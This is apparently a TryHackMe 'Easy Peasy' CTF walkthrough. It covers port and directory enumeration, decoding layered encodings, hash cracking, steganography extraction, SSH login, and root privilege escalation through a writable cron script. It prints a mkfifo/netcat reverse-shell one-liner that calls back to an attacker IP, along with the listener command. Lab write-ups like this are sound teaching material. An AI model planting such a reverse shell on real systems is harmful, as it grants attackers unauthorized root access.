# 💀 Easy Peasy — Walkthrough

🔗 **TryHackMe Room:** [Easy Peasy CTF](https://tryhackme.com/room/easypeasyctf)

```diff
> enumerate everything • trust nothing • verify everything
```

---

## 🧠 Enumeration

### Nmap Scan

```bash
nmap -Pn -A -p- <target> -v
```

![Nmap Scan](screenshots/1-nmapscan.png)

Multiple ports were discovered, including non-standard high ports.

👉 Insight:
Always scan the full port range — interesting services often hide outside common ports.

---

## 🌐 Web Enumeration

### Directory Discovery

```bash
gobuster dir -u http://<target> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

![Gobuster](screenshots/2-gobuster.png)

A hidden directory was discovered.

![WebPage Hidden](screenshots/3-httphidden.png)

Further enumeration revealed additional content:

![Gobuster Hidden](screenshots/4-gobuster.png)

![webPage Whatever](screenshots/5-httpwhatever.png)

👉 Insight:
Initial results may seem empty — always continue enumeration.

---

## 🔍 Source Code Analysis

Encoded data was found in the HTML source:

![Source Code](screenshots/6-httpwhatever_sourcecode.png)

The string was identified as Base64 and decoded.

A hash was also discovered in `robots.txt`:

![Robots](screenshots/7-robots_txt.png)

It looks like an MD5 hash...

![Hashidentifier](screenshots/8-hashidentifier.png)

👉 Insight:
Always check:

* source code
* robots.txt
* hidden directories

---

## 🔐 Service Enumeration

A web service running on a high port exposed additional data:

![Port Service](screenshots/9-http_port65524.png)

Sensitive information was found in the source code:

![Source Code Port](screenshots/10-http_port65524_sourcecode_flag.png)

Another encoded value was identified in the source:

![Encoded Value](screenshots/11-http_port65524_sourcecode_encoded.png)

The encoding was not Base64. After further analysis, it appeared to be Base62.  
Once decoded, it revealed a hidden endpoint: /n0th1ng3ls3m4tt3r

![Decoded Result](screenshots/12-decode_input.png)


👉 Insight:
When encoding is unclear, test multiple formats (Base64, Base62, etc.).

---

## 🧩 Hidden Path Discovery

The decoded value revealed a hidden directory:

![Hidden Path](screenshots/13-http_decode_input.png)

Inspecting the page source revealed additional data:

![Hidden Path Source Code](screenshots/14-http_decode_input_sourcecode.png)

A SHA-256 hash was discovered:

![Hash](screenshots/15-hashidentifier.png)

The hash was cracked using a wordlist:

```bash
john --wordlist=easypeasy.txt hash.txt
```

![John](screenshots/16-john.png)

👉 Insight:
Use context-specific wordlists when available.

---

## 🖼️ Steganography

A suspicious image was identified in the source code of the hidden endpoint: /n0th1ng3ls3m4tt3r
![Hidden Path Source Code](screenshots/14-http_decode_input_sourcecode.png)


Extraction was attempted using steghide, but a passphrase was required:

```bash
steghide extract -sf binarycodepixabay.jpg
```

![Steghide](screenshots/18-steghide_extract.png)


The passphrase was then recovered using stegseek:

```bash
stegseek <image> easypeasy.txt
```

![Stegseek](screenshots/18-stegseek_decrypted.png)

The extraction was successful and revealed a hidden file:

![Secret](screenshots/19-secrettext.png)

👉 Insight:
Steganography often relies on weak or guessable passphrases — wordlists can be highly effective.

---

## 🔑 Credential Discovery

The extracted content revealed credentials:

* username
* binary-encoded password

The binary-encoded password was decoded to plaintext.

![CyberChef](screenshots/20-cyberchef.png)

👉 Insight:
Encoding layers are often stacked — always decode step by step.

---

## 🔐 Initial Access

```bash
ssh -p <port> boring@<target>
```

![SSH](screenshots/21-ssh_flag.png)

The user flag was obfuscated using ROT13:

![ROT13](screenshots/22-rot13_flag.png)

👉 Insight:
Simple obfuscation techniques are commonly used.

---

## ⬆️ Privilege Escalation

### Sudo Check

```bash
sudo -l
```

![Sudo](screenshots/23-privesc.png)

The user could not run sudo.

---

### Cron Job Enumeration

```bash
cat /etc/crontab
```

![Crontab](screenshots/24-crontab.png)

A script executed as root was identified:

```
/var/www/.mysecretcronjob.sh
```

---

### Exploitation

The script was writable and modified to include a reverse shell:

```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc <attacker_ip> 4444 >/tmp/f
```

![Reverse Shell](screenshots/25-reverseshell.png)

Listener:

```bash
nc -lvnp 4444
```

---

### Root Access

The cron job executed the payload, resulting in a root shell:

![Root](screenshots/26-nc_access_flag.png)

👉 Insight:
Writable scripts executed by root = critical privilege escalation vector.

---

## 🧠 Final Thoughts

This room highlights:

* importance of deep enumeration
* value of source code inspection
* multiple encoding layers
* real-world misconfigurations (cron jobs + writable scripts)

---

```diff
> enumeration creates opportunities • understanding leads to access
```
